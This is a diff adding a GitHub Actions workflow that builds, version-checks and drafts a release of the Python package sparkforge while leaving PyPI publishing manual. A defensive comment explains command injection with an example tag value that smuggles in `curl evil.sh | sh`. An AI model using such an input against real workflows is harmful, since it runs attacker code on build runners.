@@ -1,0 +1,80 @@
+name: release
+
+# Constroi, prova e PARA. Nao publica no PyPI.
+#
+# Publicar e ato humano: versao publicada no PyPI nao se reescreve, so se yanka.
+# Este workflow prepara o artefato e o anexa a um release em rascunho; subir o
+# artefato ao PyPI fica com o mantenedor, com credencial dele, rodando twine a
+# mao. Quando houver Trusted Publishing configurado, vira um job a mais aqui --
+# nao um redesenho.
+on:
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: "Tag do release, ex.: v0.5.0"
+        required: true
+
+permissions:
+  contents: write
+
+jobs:
+  release:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.11"
+      - name: Install build tooling
+        run: python -m pip install --quiet build
+
+      - name: Tag agrees with the package version
+        # Guarda no unico passo irreversivel do desenho. Sem ela e possivel
+        # publicar 0.5.0 sob a tag v0.6.0, e o PyPI nao aceita reescrita.
+        #
+        # `sys.path.insert(0,'.')` importa `sparkforge` diretamente do
+        # checkout -- o mesmo padrao que o gate de procedencia (Task 6) combate
+        # em geral. Aqui e intencional: queremos a versao do FONTE, para
+        # compara-la com a tag que o humano digitou, nao a de um pacote ja
+        # instalado que poderia estar desatualizado.
+        #
+        # `TAG` chega por `env:`, nunca interpolado direto em `run:`. Um
+        # `${{ github.event.inputs.tag }}` colado no script do shell seria
+        # injecao de comando: um input como
+        # `v1.0.0"; curl evil.sh | sh; "` executaria dentro do runner. Passar
+        # por variavel de ambiente e ler com `"$TAG"` evita que o valor do
+        # input seja interpretado pelo shell.
+        env:
+          TAG: ${{ github.event.inputs.tag }}
+        run: |
+          PKG=$(python -c "import sys; sys.path.insert(0,'.'); import sparkforge; print(sparkforge.__version__)")
+          if [ "v$PKG" != "$TAG" ]; then
+            echo "tag $TAG diverge da versao do pacote v$PKG (formato esperado: v<versao>, minusculo)" >&2
+            exit 1
+          fi
+          echo "versao confirmada: $PKG"
+
+      - name: Artifact parity gate
+        # `--outdir dist` deposita o wheel e o sdist AQUI, no diretorio que o
+        # passo seguinte anexa -- e so depois que build, instalacao no venv
+        # limpo, os 539 testes de golden e `twine check` passarem.
+        #
+        # Sem isto, o passo seguinte teria que rodar `python -m build` de
+        # novo, do zero: um segundo build gera um IRMAO do artefato provado,
+        # nunca o mesmo arquivo, porque nada neste repositorio fixa
+        # `SOURCE_DATE_EPOCH` -- sdist e wheel carregam timestamp interno no
+        # zip. "Provamos que ESTE artefato reproduz os goldens" viraria
+        # "provamos que UM artefato da mesma arvore reproduz, e publicamos
+        # OUTRO" -- furo fatal num passo que, uma vez publicado, so se yanka.
+        run: python scripts/verify_wheel.py --outdir dist
+
+      - name: Draft GitHub Release with the artifacts
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ github.event.inputs.tag }}
+        run: |
+          gh release create "$TAG" \
+            --draft \
+            --title "$TAG" \
+            --notes "Artefatos construidos e verificados pelo gate de paridade. Publicacao no PyPI e manual." \
+            dist/*.whl dist/*.tar.gz
